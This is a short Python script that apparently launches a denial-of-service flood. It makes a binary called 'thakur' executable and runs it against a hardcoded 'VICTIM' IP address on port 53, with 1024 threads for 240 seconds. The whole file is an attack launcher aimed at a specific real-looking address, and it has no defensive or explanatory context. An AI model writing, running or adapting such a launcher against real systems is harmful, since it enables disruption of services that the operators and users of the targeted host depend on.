#!/usr/bin/env python3
import os
import subprocess

BINARY = "./thakur"
VICTIM = "147.75.202.61"
PORT = "53"
TIME = "240"
THREADS = "1024"

os.system(f"chmod +x thakur")
subprocess.run([BINARY, VICTIM, PORT, TIME, THREADS])
